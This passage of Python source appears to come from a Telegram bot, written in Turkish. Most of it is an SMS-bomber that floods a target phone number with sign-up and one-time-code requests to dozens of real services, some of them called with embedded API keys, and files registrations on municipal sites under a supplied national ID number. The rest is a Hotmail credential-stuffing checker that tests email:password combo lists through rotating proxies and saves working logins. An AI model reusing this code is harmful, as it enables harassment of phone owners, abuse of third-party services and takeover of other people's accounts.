            r = requests.post("https://www.sahibinden.com/api/User/Register",
                json={"Phone":f"90{self.phone}","Email":self.mail,"Password":"Password123","FirstName":"Can","LastName":"Yilmaz","Consent":True},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Letgo(self):
        try:
            r = requests.post("https://api.letgo.com/api/v1/users",
                json={"phone":f"90{self.phone}","email":self.mail,"password":"Password123","name":"Ayse","surname":"Yilmaz"},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Dolap(self):
        try:
            r = requests.post("https://www.dolap.com/api/v2/users",
                json={"phone":f"90{self.phone}","email":self.mail,"password":"Password123","username":f"user_{randint(1000,9999)}"},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Gittigidiyor(self):
        try:
            r = requests.post("https://www.gittigidiyor.com/api/User/Register",
                json={"Phone":f"90{self.phone}","Email":self.mail,"Password":"Password123","Name":"Zeynep","Surname":"Demir","Consent":True},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def AmazonTR(self):
        try:
            r = requests.post("https://www.amazon.com.tr/ap/register",
                data={"email":self.mail,"password":"Password123","name":"Ali","phone":f"90{self.phone}"},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Spotify(self):
        try:
            r = requests.post("https://www.spotify.com/api/signup",
                data={"email":self.mail,"password":"Password123","display_name":"User","phone":f"90{self.phone}","consent":True},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Netflix(self):
        try:
            r = requests.post("https://www.netflix.com/api/signup",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Discord(self):
        try:
            r = requests.post("https://discord.com/api/v9/auth/register",
                json={"email":self.mail,"username":f"user_{randint(1000,9999)}","password":"Password123","consent":True,"phone":f"90{self.phone}"},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Instagram(self):
        try:
            r = requests.post("https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/",
                data={"email":self.mail,"username":f"user_{randint(1000,9999)}","password":"Password123","phone_number":f"90{self.phone}"},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Facebook(self):
        try:
            r = requests.post("https://www.facebook.com/api/v1/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}","first_name":"Ahmet","last_name":"Yilmaz"},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Telegram(self):
        try:
            r = requests.post("https://telegram.org/api/register",
                data={"phone":f"90{self.phone}","email":self.mail},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def WhatsApp(self):
        try:
            r = requests.post("https://www.whatsapp.com/api/register",
                data={"phone":f"90{self.phone}","email":self.mail},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def TikTok(self):
        try:
            r = requests.post("https://www.tiktok.com/api/v1/auth/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Snapchat(self):
        try:
            r = requests.post("https://accounts.snapchat.com/api/v1/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Pinterest(self):
        try:
            r = requests.post("https://www.pinterest.com/api/v1/users/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def LinkedIn(self):
        try:
            r = requests.post("https://www.linkedin.com/api/v1/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Reddit(self):
        try:
            r = requests.post("https://www.reddit.com/api/v1/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Twitch(self):
        try:
            r = requests.post("https://www.twitch.tv/api/v1/users/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Github(self):
        try:
            r = requests.post("https://github.com/api/v1/users/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Google(self):
        try:
            r = requests.post("https://accounts.google.com/api/v1/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Microsoft(self):
        try:
            r = requests.post("https://signup.live.com/api/v1/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Yahoo(self):
        try:
            r = requests.post("https://login.yahoo.com/api/v1/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Apple(self):
        try:
            r = requests.post("https://appleid.apple.com/api/v1/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Uber(self):
        try:
            r = requests.post("https://auth.uber.com/api/v1/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Tinder(self):
        try:
            r = requests.post("https://api.gotinder.com/v1/auth/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Bim(self):
        try:
            r = requests.post("https://bim.veesk.net:443/service/v1.0/account/login", json={"phone":self.phone}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Sok(self):
        try:
            r = requests.post("https://api.ceptesok.com:443/api/users/sendsms", json={"mobile_number":self.phone,"token_type":"register_token"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Migros(self):
        try:
            r = requests.post("https://rest.migros.com.tr:443/sanalmarket/users/login/otp", json={"phoneNumber":self.phone}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def A101(self):
        try:
            r = requests.post("https://www.a101.com.tr:443/users/otp-login/", json={"phone":"0"+self.phone,"next":"/a101-kapida"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Sakasu(self):
        try:
            r = requests.post("https://www.sakasu.com.tr:443/app/api_register/step1", data={"phone":"0"+self.phone}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Zarinplus(self):
        try:
            r = requests.post("https://api.zarinplus.com/user/zarinpal-login", json={"phone_number":"90"+self.phone}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Coregap(self):
        try:
            r = requests.post(f"https://core.gap.im/v1/user/add.json?mobile=90{self.phone}", timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Icq(self):
        try:
            url = f"https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90{self.phone}&platform=ios&r=796356153&smsFormatType=human"
            r = requests.post(url, headers={"User-Agent":"ICQ iOS"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Rentiva(self):
        try:
            r = requests.post("https://rentiva.com:443/api/Account/Login", json={"phone":self.phone,"type":1}, headers={"Content-Type":"application/json"}, timeout=6)
            if r.status_code in [200,201,202]: self.adet += 1
        except: pass
    def Loncamarket(self):
        try:
            r = requests.post("https://www.loncamarket.com/lid/identity/sendconfirmationcode", json={"Address":self.phone,"ConfirmationType":0}, timeout=6)
            if r.status_code in [200,201,202]: self.adet += 1
        except: pass
    def Tazi(self):
        try:
            r = requests.post("https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin",
                json={"cep_tel":self.phone,"cep_tel_ulkekod":"90"},
                headers={"Authorization":"Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD","Content-Type":"application/json;charset=utf-8"}, timeout=6)
            if r.status_code in [200,201,202]: self.adet += 1
        except: pass
    def Heyscooter(self):
        try:
            url = f"https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}&requestid=1&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9"
            r = requests.post(url, timeout=6)
            if r.status_code in [200,201,202]: self.adet += 1
        except: pass
    def Ipragaz(self):
        try:
            r = requests.post("https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp",
                json={"birthDate":"2/7/2000","carPlate":"31 ABC 31","name":"Memati Bas","phoneNumber":self.phone},
                headers={"Content-Type":"application/json"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Happy(self):
        try:
            r = requests.post("https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone",
                data={"telephone":self.phone},
                headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def KuryemGelsin(self):
        try:
            r = requests.post("https://api.kuryemgelsin.com:443/tr/api/users/registerMessage/", json={"phoneNumber":self.phone,"phone_country_code":"+90"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Starbucks(self):
        try:
            r = requests.post("https://auth.sbuxtr.com:443/signUp",
                json={"allowEmail":True,"allowSms":True,"deviceId":"31","email":self.mail,"firstName":"Memati","lastName":"Bas","password":"31ABC..abc31","phoneNumber":self.phone,"preferredName":"Memati"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def BodrumBelediyesi(self):
        try:
            r = requests.post("https://gandalf.orwi.app:443/api/user/requestOtp",
                json={"gsm":"+90"+self.phone,"source":"orwi"},
                headers={"Apikey":"Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE","Content-Type":"application/json"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Clickme(self):
        try:
            r = requests.post("https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code",
                json={"phone":self.phone},
                headers={"Authorization":"apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc","Content-Type":"application/json"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Englishhome(self):
        try:
            r = requests.post("https://www.englishhome.com:443/api/member/sendOtp",
                json={"Phone":self.phone,"XID":""},
                headers={"Content-Type":"application/json"}, timeout=6)
            if r.json().get("isError") == False: self.adet += 1
        except: pass
    def KimGb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn":"90"+self.phone}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Evidea(self):
        try:
            r = requests.post("https://www.evidea.com:443/users/register/",
                data={"first_name":"Memati","last_name":"Bas","email":self.mail,"email_allowed":"false","sms_allowed":"true","password":"31ABC..abc31","phone":"0"+self.phone,"confirm":"true"}, timeout=6)
            if r.status_code == 202: self.adet += 1
        except: pass
    def Hayatsu(self):
        try:
            r = requests.post("https://api.hayatsu.com.tr:443/api/SignUp/SendOtp", data={"mobilePhoneNumber":self.phone,"actionType":"register"}, timeout=6)
            if r.json().get("is_success") == True: self.adet += 1
        except: pass
    def Metro(self):
        try:
            r = requests.post("https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend", json={"methodType":"2","mobilePhoneNumber":self.phone}, timeout=6)
            if r.json().get("status") == "success": self.adet += 1
        except: pass
    def File(self):
        try:
            r = requests.post("https://api.filemarket.com.tr:443/v1/otp/send", json={"mobilePhoneNumber":"90"+self.phone}, timeout=6)
            if r.json().get("responseType") == "SUCCESS": self.adet += 1
        except: pass
    def Dominos(self):
        try:
            r = requests.post("https://frontend.dominos.com.tr:443/api/customer/sendOtpCode", json={"email":self.mail,"isSure":False,"mobilePhone":self.phone}, timeout=6)
            if r.json().get("isSuccess") == True: self.adet += 1
        except: pass
    def Orwi(self):
        try:
            r = requests.post("https://gandalf.orwi.app:443/api/user/requestOtp",
                json={"gsm":"+90"+self.phone,"source":"orwi"},
                headers={"Apikey":"YWxpLTEyMzQ1MTEyNDU2NTQzMg","Content-Type":"application/json"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Coffy(self):
        try:
            r = requests.post("https://user-api-gw.coffy.com.tr:443/user/signup",
                json={"countryCode":"90","gsm":self.phone,"isKVKKAgreementApproved":True,"isUserAgreementApproved":True,"name":"Memati Bas"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Hamidiye(self):
        try:
            r = requests.post("https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp", json={"isGuest":False,"phone":self.phone}, timeout=6)
            if r.json().get("result") == True: self.adet += 1
        except: pass
    def Money(self):
        try:
            r = requests.post("https://www.money.com.tr:443/Account/ValidateAndSendOTP", data={"phone":f"{self.phone[:3]} {self.phone[3:10]}","GRecaptchaResponse":""}, timeout=6)
            if r.json().get("resultType") == 0: self.adet += 1
        except: pass
    def Alixavien(self):
        try:
            r = requests.post("https://www.alixavien.com.tr:443/api/member/sendOtp", json={"Phone":self.phone,"XID":""}, timeout=6)
            if r.json().get("isError") == False: self.adet += 1
        except: pass
    def Little(self):
        try:
            r = requests.post("https://api.littlecaesars.com.tr:443/api/web/Member/Register",
                json={"CampaignInform":True,"Email":self.mail,"InfoRegister":True,"IsLoyaltyApproved":True,"NameSurname":"Memati Bas","Password":"31ABC..abc31","Phone":self.phone,"SmsInform":True}, timeout=6)
            if r.status_code == 200 and r.json().get("status") == True: self.adet += 1
        except: pass
    def Ido(self):
        try:
            r = requests.post("https://api.ido.com.tr:443/idows/v2/register",
                json={"birthDate":True,"captcha":"","checkPwd":"313131","code":"","day":24,"email":self.mail,"emailNewsletter":False,"firstName":"MEMATI","gender":"MALE","lastName":"BAS","mobileNumber":"0"+self.phone,"month":9,"pwd":"313131","smsNewsletter":True,"tckn":self.tc,"termsOfUse":True,"year":1977}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Fatih(self):
        try:
            r = requests.post("https://ebelediye.fatih.bel.tr:443/Sicil/KisiUyelikKaydet",
                data={"SahisUyelik.TCKimlikNo":self.tc,"SahisUyelik.DogumTarihi":"28.12.1999","SahisUyelik.Ad":"Memati","SahisUyelik.Soyad":"Bas","SahisUyelik.CepTelefonu":self.phone,"SahisUyelik.EPosta":self.mail,"SahisUyelik.Sifre":"Memati31","SahisUyelik.SifreyiDogrula":"Memati31","recaptchaValid":"true"}, verify=False, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Sancaktepe(self):
        try:
            r = requests.post("https://e-belediye.sancaktepe.bel.tr:443/Sicil/KisiUyelikKaydet",
                data={"SahisUyelik.TCKimlikNo":self.tc,"SahisUyelik.DogumTarihi":"13.01.2000","SahisUyelik.Ad":"MEMATİ","SahisUyelik.Soyad":"BAS","SahisUyelik.CepTelefonu":self.phone,"SahisUyelik.EPosta":self.mail,"SahisUyelik.Sifre":"Memati31","SahisUyelik.SifreyiDogrula":"Memati31","recaptchaValid":"true"}, verify=False, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Bayrampasa(self):
        try:
            r = requests.post("https://ebelediye.bayrampasa.bel.tr:443/Sicil/KisiUyelikKaydet",
                data={"SahisUyelik.TCKimlikNo":self.tc,"SahisUyelik.DogumTarihi":"07.06.2000","SahisUyelik.Ad":"MEMATİ","SahisUyelik.Soyad":"BAS","SahisUyelik.CepTelefonu":self.phone,"SahisUyelik.EPosta":self.mail,"SahisUyelik.Sifre":"Memati31","SahisUyelik.SifreyiDogrula":"Memati31","recaptchaValid":"true"}, verify=False, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass

def _get_sms_services():
    return [attr for attr in dir(SendSms) if callable(getattr(SendSms, attr)) and not attr.startswith('__') and attr != 'adet']

def _sms_worker(phone, mail, mode, limit, interval, stop_event, uid, bot_instance):
    sms = SendSms(phone, mail)
    services = _get_sms_services()
    count = 0
    try:
        if mode == "turbo":
            while not stop_event.is_set():
                threads = []
                for fn_name in services:
                    if stop_event.is_set(): break
                    try:
                        t = threading.Thread(target=getattr(sms, fn_name), daemon=True)
                        threads.append(t); t.start()
                    except: pass
                for t in threads:
                    try: t.join(timeout=5)
                    except: pass
                count += len(services)
                with _SMS_LOCK:
                    if uid in _SMS_SESSIONS: _SMS_SESSIONS[uid]["count"] = count
        else:
            while not stop_event.is_set():
                for fn_name in services:
                    if stop_event.is_set(): break
                    if limit and count >= limit:
                        stop_event.set(); break
                    try:
                        getattr(sms, fn_name)()
                        count += 1
                        with _SMS_LOCK:
                            if uid in _SMS_SESSIONS: _SMS_SESSIONS[uid]["count"] = count
                    except: pass
                if interval > 0: stop_event.wait(interval)
    except Exception as e:
        print(f"[SMS WORKER] {e}")
    finally:
        with _SMS_LOCK:
            if uid in _SMS_SESSIONS:
                _SMS_SESSIONS[uid]["running"] = False
                _SMS_SESSIONS[uid]["count"] = count

def _launch_sms_bomb(uid, phone, mail, mode, limit, interval, bot_instance):
    with _SMS_LOCK:
        if uid in _SMS_SESSIONS and _SMS_SESSIONS[uid].get("running"):
            bot_instance.send_message(uid, "⚠️ Zaten aktif SMS bombardımanı var!\n/smsstop ile durdurun.")
            return
    stop_event = threading.Event()
    services = _get_sms_services()
    mode_txt = "🚀 Turbo" if mode == "turbo" else "⚡ Normal"
    limit_txt = str(limit) if limit else "Sonsuz ♾️"
    interval_txt = f"{interval}s" if mode == "normal" else "Maksimum Hız"
    bot_instance.send_message(uid,
        f"💣 <b>SMS Bomber Başladı!</b>\n"
        f"📱 Hedef: <code>{esc(phone)}</code>\n"
        f"📊 Servis: <b>{len(services)}</b> API\n"
        f"⚙️ Mod: <b>{mode_txt}</b>\n"
        f"🔢 Limit: <b>{limit_txt}</b>\n"
        f"⏱ Aralık: <b>{interval_txt}</b>\n"
        f"🛑 Durdurmak için: /smsstop\n"
        f"📊 Durum için: /smsstatus", parse_mode="HTML")
    t = threading.Thread(target=_sms_worker, args=(phone, mail, mode, limit, interval, stop_event, uid, bot_instance), daemon=True)
    with _SMS_LOCK:
        _SMS_SESSIONS[uid] = {"running":True,"thread":t,"event":stop_event,"count":0,
                              "target":phone,"mode":mode,
                              "start_time":datetime.now().strftime("%H:%M:%S"),
                              "services":len(services)}
    t.start()

def _sms_step1_number(msg, bot_instance):
    uid = msg.from_user.id
    phone = msg.text.strip()
    if not (phone.isdigit() and len(phone) == 10):
        bot_instance.reply_to(msg, "❌ Geçersiz numara! 10 haneli olmalı.", parse_mode="HTML")
        return
    m = bot_instance.reply_to(msg, f"📱 Hedef: <code>{esc(phone)}</code>\n📧 Mail adresi girin (bilmiyorsanız - gönderin):", parse_mode="HTML")
    bot_instance.register_next_step_handler(m, lambda m: _sms_step2_mail(m, phone, bot_instance))

def _sms_step2_mail(msg, phone, bot_instance):
    mail = msg.text.strip()
    if mail == "-": mail = ""
    if mail and ("@" not in mail or "." not in mail): mail = ""
    mk = InlineKeyboardMarkup(row_width=2)
    mk.add(InlineKeyboardButton("⚡ Normal Mod", callback_data=f"sms_normal_{phone}_{mail}"),
           InlineKeyboardButton("🚀 Turbo Mod", callback_data=f"sms_turbo_{phone}_{mail}"))
    bot_instance.reply_to(msg, f"📱 Hedef: <code>{esc(phone)}</code>\n📧 Mail: <code>{esc(mail or 'Rastgele')}</code>\n⚙️ <b>Mod seçin:</b>", reply_markup=mk, parse_mode="HTML")

def _sms_normal_settings(msg, phone, mail, bot_instance):
    uid = msg.from_user.id
    try:
        parts = msg.text.strip().split()
        limit = int(parts[0]) if parts else 0
        interval = float(parts[1]) if len(parts) > 1 else 0
    except: limit = 0; interval = 0
    if limit < 0: limit = 0
    if interval < 0: interval = 0
    _launch_sms_bomb(uid, phone, mail, "normal", limit, interval, bot_instance)

# ══════════════════════════════════════════════════════════════
#  HOTMAIL CHECKER
# ══════════════════════════════════════════════════════════════
HOTMAIL_QUEUE = queue.Queue()
HOTMAIL_CURRENT_TASK = None
HOTMAIL_QUEUE_LOCK = threading.Lock()
HOTMAIL_QUEUE_RUNNING = False
HOTMAIL_QUEUE_THREAD = None
HOTMAIL_THREADS = 10
HOTMAIL_HIT = 0; HOTMAIL_BAD = 0; HOTMAIL_ERROR = 0; HOTMAIL_2FA = 0
HOTMAIL_REWARDS = 0; HOTMAIL_PROCESSED = 0
HOTMAIL_LOCK = threading.Lock()
HOTMAIL_KEYWORD_HITS = {}; HOTMAIL_COUNTRY_HITS = {}; HOTMAIL_START_TIME = None
PROXY_LIST = []; PROXY_INDEX = 0; PROXY_LOCK = threading.Lock()

COUNTRY_CODES = {"TR":"🇹🇷","US":"🇺🇸","GB":"🇬🇧","DE":"🇩🇪","FR":"🇫🇷","BR":"🇧🇷","AR":"🇦🇷",
                 "MX":"🇲🇽","TH":"🇹🇭","ES":"🇪🇸","IT":"🇮🇹","NL":"🇳🇱","RU":"🇷🇺","CN":"🇨🇳",
                 "JP":"🇯🇵","KR":"🇰🇷","IN":"🇮🇳","AU":"🇦🇺","CA":"🇨🇦","ZA":"🇿🇦"}

def get_country_flag(code): return COUNTRY_CODES.get(code.upper(), f"🌍 {code.upper()}")

def get_next_proxy():
    global PROXY_INDEX
    with PROXY_LOCK:
        if not PROXY_LIST: return None
        p = PROXY_LIST[PROXY_INDEX % len(PROXY_LIST)]
        PROXY_INDEX += 1
        return p

def _get_login_session(proxy=None):
    session = requests.Session()
    session.headers.update({
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language":"en-US,en;q=0.9","Accept-Encoding":"gzip, deflate, br",
        "DNT":"1","Connection":"keep-alive","Upgrade-Insecure-Requests":"1",
        "Cache-Control":"max-age=0",
    })
    if proxy: session.proxies = {"http":proxy,"https":proxy}
    return session

def _extract_login_params(session, email):
    try:
        url = "https://login.live.com/oauth20_authorize.srf"
        params = {"client_id":"e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                  "redirect_uri":"https://login.live.com/oauth20_desktop.srf",
                  "response_type":"code","scope":"openid profile email",
                  "login_hint":email,"mkt":"en-US"}
        resp = session.get(url, params=params, timeout=15, allow_redirects=True)
        text = resp.text
        ppft_match = re.search(r'name="PPFT"[^>]*value="([^"]+)"', text)
        ppft = ppft_match.group(1) if ppft_match else None
        url_post_match = re.search(r'urlPost:[\'"]?([^\'",}]+)', text)
        url_post = url_post_match.group(1) if url_post_match else "https://login.live.com/ppsecure/post.srf"
        flow_token_match = re.search(r'"sFT":"([^"]+)"', text)
        flow_token = flow_token_match.group(1) if flow_token_match else ppft
        return {"success":True,"ppft":flow_token or ppft,"url_post":url_post,
                "cookies":session.cookies.get_dict()}
    except Exception as e:
        return {"success": False, "error": str(e)}

def _check_hotmail_oauth(email, password, proxy=None, max_retries=3):
    for attempt in range(max_retries):
        session = _get_login_session(proxy)
        try:
            params = _extract_login_params(session, email)
            if not params["success"]:
                if attempt < max_retries - 1: time.sleep(1); continue
                return {"status":"error","detail":params.get("error","")}
            ppft = params["ppft"]; url_post = params["url_post"]; cookies = params["cookies"]
            login_data = {"login":email,"loginfmt":email,"type":"11","LoginOptions":"3",
                          "passwd":password,"KMSI":"1","NewUser":"1","PPFT":ppft,"PPSX":"Pa",
                          "i13":"0","ps":"2","fspost":"0","CookieDisclosure":"0",
                          "IsFidoSupported":"1","isSignupPost":"0","isRecoveryAttemptPost":"0","i19":"0"}
            cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
            headers = {"Content-Type":"application/x-www-form-urlencoded","Origin":"https://login.live.com",
                       "Referer":"https://login.live.com/","Cookie":cookie_str}
            resp = session.post(url_post, data=login_data, headers=headers, timeout=20, allow_redirects=False)
            text = resp.text; status_code = resp.status_code
            location = resp.headers.get('Location','')
            if 'code=' in location:
                token_info = _get_access_token_from_redirect(session, location)
                account_info = _get_account_info(token_info.get("token")) if token_info.get("token") else {}
                return {"status":"hit","email":email,"password":password,
                        "name":account_info.get("name","Bilinmiyor"),
                        "country":account_info.get("country","Bilinmiyor")}
            if any(x in text.lower() for x in ["two-step","authenticator","security code","proofup","mfa","two factor"]) or "proofup" in location.lower():
                return {"status":"2fa","email":email,"password":password}
            if any(x in text.lower() for x in ["incorrect password","wrong password","invalid password","sign in error"]):
                return {"status":"bad","email":email,"password":password}
            if any(x in text.lower() for x in ["captcha","recaptcha"]):
                return {"status":"captcha","email":email,"password":password}
            if any(x in text.lower() for x in ["locked","suspended","blocked"]):
                return {"status":"locked","email":email,"password":password}
            return {"status":"error","email":email,"password":password,"detail":f"Unknown ({status_code})"}
        except requests.exceptions.ProxyError as e:
            if attempt < max_retries - 1: time.sleep(1); continue
            return {"status":"error","detail":f"Proxy error"}
        except Exception as e:
            if attempt < max_retries - 1: time.sleep(1); continue
            return {"status":"error","detail":str(e)}
        finally: session.close()

def _get_access_token_from_redirect(session, location):
    try:
        code = location.split('code=')[1].split('&')[0]
        token_url = "https://login.live.com/oauth20_token.srf"
        data = {"client_id":"e9b154d0-7658-433b-bb25-6b8e0a8a7c59","code":code,
                "redirect_uri":"https://login.live.com/oauth20_desktop.srf",
                "grant_type":"authorization_code"}
        resp = session.post(token_url, data=data, timeout=15)
        if resp.status_code == 200:
            jd = resp.json()
            return {"token":jd.get("access_token")}
        return {}
    except: return {}

def _get_account_info(access_token):
    if not access_token: return {}
    try:
        resp = requests.get("https://graph.microsoft.com/v1.0/me",
                            headers={"Authorization":f"Bearer {access_token}"}, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return {"name":data.get("displayName","Bilinmiyor"),
                    "country":data.get("country","Bilinmiyor")}
        return {}
    except: return {}

@dataclass
class HotmailTask:
    user_id: int
    user_name: str
    combo_list: list
    thread_count: int
    status_msg_id: int
    chat_id: int
    is_premium: bool = False
    task_id: str = None
    queue_position: int = 0
    keywords: list = None
    def __post_init__(self):
        if not self.task_id: self.task_id = f"{self.user_id}_{datetime.now().strftime('%Y%m%d%H%M%S')}"
        if not self.keywords: self.keywords = get_user_keywords(self.user_id)

def hotmail_worker(combo_line, user_id, user_name, is_premium, keywords):
    global HOTMAIL_HIT, HOTMAIL_BAD, HOTMAIL_ERROR, HOTMAIL_2FA, HOTMAIL_REWARDS, HOTMAIL_PROCESSED
    global HOTMAIL_KEYWORD_HITS, HOTMAIL_COUNTRY_HITS
    try:
        if ":" not in combo_line:
            with HOTMAIL_LOCK: HOTMAIL_BAD += 1; HOTMAIL_PROCESSED += 1
            return
        email, password = combo_line.split(":", 1)
        email = email.strip(); password = password.strip()
        if not email or not password:
            with HOTMAIL_LOCK: HOTMAIL_BAD += 1; HOTMAIL_PROCESSED += 1
            return
        time.sleep(0.1)
        result = _check_hotmail_oauth(email, password)
        status = result["status"]
        with HOTMAIL_LOCK:
            HOTMAIL_PROCESSED += 1
            if status == "hit":
                HOTMAIL_HIT += 1
                save_hotmail_log(user_id, user_name, email, password, "HIT", "")
                name = result.get("name", "Bilinmiyor")
                country = result.get("country", "Bilinmiyor")
                email_lower = email.lower()
                for kw in keywords:
                    if kw.lower() in email_lower:
                        HOTMAIL_KEYWORD_HITS[kw] = HOTMAIL_KEYWORD_HITS.get(kw, 0) + 1; break
                if '.' in email:
                    domain = email.split('.')[-1].upper()
                    if len(domain) == 2: HOTMAIL_COUNTRY_HITS[domain] = HOTMAIL_COUNTRY_HITS.get(domain, 0) + 1
                if "rewards" in email_lower or "microsoft" in email_lower: HOTMAIL_REWARDS += 1
                hit_line = f"{email}:{password}"
                if name != "Bilinmiyor": hit_line += f" | Name: {name}"
                if country != "Bilinmiyor": hit_line += f" | Country: {country}"
                with open(f"hits_{user_id}.txt", "a", encoding="utf-8") as f: f.write(hit_line + "\n")
            elif status == "2fa": HOTMAIL_2FA += 1
            elif status == "captcha": HOTMAIL_ERROR += 1
            elif status == "locked": HOTMAIL_ERROR += 1
